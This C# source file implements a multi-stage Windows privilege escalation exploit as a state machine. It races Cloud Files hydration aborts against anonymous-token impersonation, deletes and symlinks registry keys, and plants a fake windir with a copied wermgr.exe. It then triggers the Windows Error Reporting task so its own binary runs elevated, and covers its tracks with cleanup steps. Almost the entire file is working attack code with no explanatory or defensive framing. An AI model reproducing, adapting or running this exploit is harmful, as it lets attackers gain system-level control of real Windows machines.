    #region State Machine

    /// <summary>
    /// Exploit execution state machine
    /// </summary>
    public enum ExploitState
    {
        Initial,
        SpawningStages,
        AbortingHydration,
        CleaningRegistry,
        CreatingSymlink,
        ExecutingPayload,
        ElevatedExecution,
        Completed,
        Failed
    }

    public class ExploitStateMachine
    {
        private ExploitState _currentState;
        private readonly RegistryService _registryService;

        public ExploitState CurrentState
        {
            get => _currentState;
            private set
            {
                Logger.Info($"State transition: {_currentState} -> {value}");
                _currentState = value;
            }
        }

        public ExploitStateMachine()
        {
            _currentState = ExploitState.Initial;
            _registryService = new RegistryService();
        }

        public void ExecuteStage(int stageNumber)
        {
            try
            {
                Logger.Info($"=== Executing Stage {stageNumber} ===");

                switch (stageNumber)
                {
                    case 0:
                        CurrentState = ExploitState.SpawningStages;
                        Stage0_SpawnSubprocesses();
                        break;
                    case 1:
                        CurrentState = ExploitState.AbortingHydration;
                        Stage1_AbortHydration(true);
                        break;
                    case 2:
                        CurrentState = ExploitState.CleaningRegistry;
                        Stage2_CleanAndSymlink();
                        break;
                    case 3:
                        CurrentState = ExploitState.ExecutingPayload;
                        Stage3_ExecutePayload();
                        break;
                    default:
                        throw new ArgumentException($"Invalid stage number: {stageNumber}");
                }

                CurrentState = ExploitState.Completed;
                Logger.Info($"=== Stage {stageNumber} completed successfully ===");
            }
            catch (Exception ex)
            {
                CurrentState = ExploitState.Failed;
                Logger.Critical($"Stage {stageNumber} failed", ex);
                throw;
            }
        }

        #region Stage Implementations

        private void Stage0_SpawnSubprocesses()
        {
            Logger.Info("Spawning child processes for stages 1-3");

            for (int i = 1; i < ExploitConfig.TOTAL_STAGES; ++i)
            {
                try
                {
                    Logger.Debug($"Spawning stage {i} process");

                    var config = new Win32ProcessConfig
                    {
                        CommandLine = i.ToString(),
                        ApplicationName = typeof(Program).Assembly.Location,
                        TerminateOnDispose = true
                    };

                    using (var process = Win32Process.CreateProcess(config))
                    {
                        var waitResult = process.Process.Wait(ExploitConfig.STAGE_PROCESS_TIMEOUT_SECONDS);

                        if (waitResult != NtStatus.STATUS_SUCCESS)
                        {
                            throw new InvalidOperationException($"Stage {i} process did not complete successfully");
                        }

                        Logger.Info($"Stage {i} process completed");
                    }
                }
                catch (Exception ex)
                {
                    Logger.Error($"Failed to spawn stage {i} process", ex);
                    throw;
                }
            }
        }

        private void Stage1_AbortHydration(bool monitorRootKey)
        {
            Logger.Info("Starting hydration abort loop with registry monitoring");

            // Start registry change monitoring thread
            var checkKeyThread = new Thread(CheckKeyThread)
            {
                IsBackground = true
            };
            checkKeyThread.Start(monitorRootKey);

            Thread.Sleep(ExploitConfig.THREAD_STARTUP_DELAY_MS);

            // Start anonymous token forcing thread
            var currentThread = NtThread.OpenCurrent();
            var anonThread = new Thread(ForceTokenThread)
            {
                IsBackground = true
            };
            anonThread.Start(currentThread);

            Logger.Info("Entering infinite hydration abort loop");

            // Infinite loop calling CfAbortOperation
            while (true)
            {
                NativeInterop.CfAbortOperation(
                    NtProcess.Current.ProcessId,
                    IntPtr.Zero,
                    NativeInterop.AbortHydrationFlags.Block
                );
            }
        }

        private void Stage2_CleanAndSymlink()
        {
            Logger.Info("Cleaning CloudFiles registry and creating symlink");

            // Clean up CloudFiles registry key
            using (var key = _registryService.OpenKey(
                null,
                ExploitConfig.CLOUD_FILES_KEY,
                KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner | KeyAccessRights.EnumerateSubKeys))
            {
                _registryService.SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
                _registryService.DeleteRegistryTree(key);
            }

            // Create symbolic link
            _registryService.CreateSymbolicLink(ExploitConfig.BLOCKED_APPS_KEY, ExploitConfig.TARGET_KEY);

            // Trigger hydration abort again
            Stage1_AbortHydration(false);
        }

        private void Stage3_ExecutePayload()
        {
            Logger.Info("Executing final payload stage");

            // Cleanup symbolic link
            CleanupSymbolicLink();

            // Fix target key permissions
            FixTargetKeyPermissions();

            // Cleanup subkeys
            _registryService.CleanupSubkeys(ExploitConfig.TARGET_KEY, ExploitConfig.VOLATILE_ENV_SUBKEY);

            // Set windir value
            SetFakeWindowsDirectory();

            // Create fake System32 and wermgr.exe
            var fakeWerPath = CreateFakeWerManager();

            // Setup named pipe and trigger WER task
            bool exploitSucceeded = TriggerWindowsErrorReporting();

            // Cleanup
            CleanupFakeFiles(fakeWerPath);

            // Delete target key value
            CleanupTargetKey();

            if (exploitSucceeded)
            {
                Logger.Info("*** EXPLOIT SUCCEEDED ***");
            }
            else
            {
                Logger.Warning("Exploit failed - no connection received");
            }
        }

        #endregion

        #region Helper Methods

        private void CleanupSymbolicLink()
        {
            try
            {
                using (var key = _registryService.OpenKey(null, ExploitConfig.BLOCKED_APPS_KEY, KeyAccessRights.Delete))
                {
                    Logger.Info($"Cleaning up symbolic link: {key.FullPath}");
                    key.Delete();
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Failed to cleanup symbolic link", ex);
                throw;
            }
        }

        private void FixTargetKeyPermissions()
        {
            try
            {
                using (var key = _registryService.OpenKey(
                    null,
                    ExploitConfig.TARGET_KEY,
                    KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner))
                {
                    _registryService.SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Failed to fix target key permissions", ex);
                throw;
            }
        }

        private void SetFakeWindowsDirectory()
        {
            try
            {
                var currentExePath = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
                _registryService.SetRegistryValue(ExploitConfig.TARGET_KEY, "windir", currentExePath);
                Logger.Info($"Set fake windir to: {currentExePath}");
            }
            catch (Exception ex)
            {
                Logger.Error("Failed to set fake Windows directory", ex);
                throw;
            }
        }

        private string CreateFakeWerManager()
        {
            try
            {
                var currentExePath = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
                var fakeSystem32 = currentExePath + ExploitConfig.SYSTEM32_SUBDIR;
                var fakeWerPath = fakeSystem32 + ExploitConfig.WERMGR_EXECUTABLE;

                Logger.Info($"Creating fake System32 directory: {fakeSystem32}");
                Directory.CreateDirectory(fakeSystem32);

                Logger.Info($"Copying executable to: {fakeWerPath}");
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, fakeWerPath, true);

                return fakeWerPath;
            }
            catch (Exception ex)
            {
                Logger.Error("Failed to create fake WER manager", ex);
                throw;
            }
        }

        private bool TriggerWindowsErrorReporting()
        {
            try
            {
                Logger.Info("Setting up named pipe server");
                using (var serverPipe = new NamedPipeServerStream(ExploitConfig.PIPE_NAME))
                {
                    var pipeWaitTask = serverPipe.WaitForConnectionAsync();

                    Logger.Info("Triggering Windows Error Reporting task");
                    using (var taskService = new TaskService())
                    {
                        var werTask = taskService.GetTask(ExploitConfig.WER_TASK_PATH);
                        werTask.Run();
                        werTask.Dispose();
                    }

                    Logger.Info($"Waiting for pipe connection (timeout: {ExploitConfig.PIPE_CONNECTION_TIMEOUT_MS}ms)");
                    bool connected = pipeWaitTask.Wait(ExploitConfig.PIPE_CONNECTION_TIMEOUT_MS);

                    return connected;
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Failed to trigger Windows Error Reporting", ex);
                return false;
            }
        }

        private void CleanupFakeFiles(string fakeWerPath)
        {
            Thread.Sleep(ExploitConfig.CLEANUP_DELAY_MS);

            try
            {
                var fakeSystem32 = Path.GetDirectoryName(fakeWerPath);

                Logger.Info($"Cleaning up fake files: {fakeWerPath}");
                if (File.Exists(fakeWerPath))
                    File.Delete(fakeWerPath);

                if (Directory.Exists(fakeSystem32))
                    Directory.Delete(fakeSystem32);

                Logger.Debug("Cleanup completed");
            }
            catch (Exception ex)
            {
                Logger.Warning("Failed to cleanup fake files (non-critical)", ex);
            }
        }

        private void CleanupTargetKey()
        {
            try
            {
                using (var key = NtKey.Open(ExploitConfig.TARGET_KEY, null, KeyAccessRights.Delete))
                {
                    Logger.Info("Deleting target registry key value");
                    key.Delete(false);
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Failed to cleanup target key", ex);
                throw;
            }
        }

        #endregion

        #region Background Threads

        private static void CheckKeyThread(object rootKeyParam)
        {
            bool monitorRootKey = (bool)rootKeyParam;
            string path = monitorRootKey ? ExploitConfig.ROOT_KEY : ExploitConfig.DEFAULT_USER_KEY;

            try
            {
                Logger.Debug($"Registry monitoring thread started for: {path}");

                using (var key = NtKey.Open(path, null, KeyAccessRights.MaximumAllowed))
                {
                    while (true)
                    {
                        var status = key.NotifyChange(NotifyCompletionFilter.Name, true);

                        if (status == NtStatus.STATUS_NOTIFY_ENUM_DIR)
                        {
                            Logger.Info("Registry change detected - terminating process");
                            Environment.Exit(0);
                            break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Registry monitoring thread failed", ex);
            }
        }

        private static void ForceTokenThread(object threadParam)
        {
            try
            {
                using (var thread = (NtThread)threadParam)
                {
                    Logger.Debug($"Token forcing thread started for thread: {thread}");

                    using (var token = TokenUtils.GetAnonymousToken())
                    {
                        while (true)
                        {
                            thread.SetImpersonationToken(token);
                            thread.SetImpersonationToken(null);
                        }
                    }
                }
            }
            catch (ThreadAbortException)
            {
                Logger.Debug("Token forcing thread aborted");
                return;
            }
            catch (Exception ex)
            {
                Logger.Error("Token forcing thread failed", ex);
            }
        }

        #endregion
    }

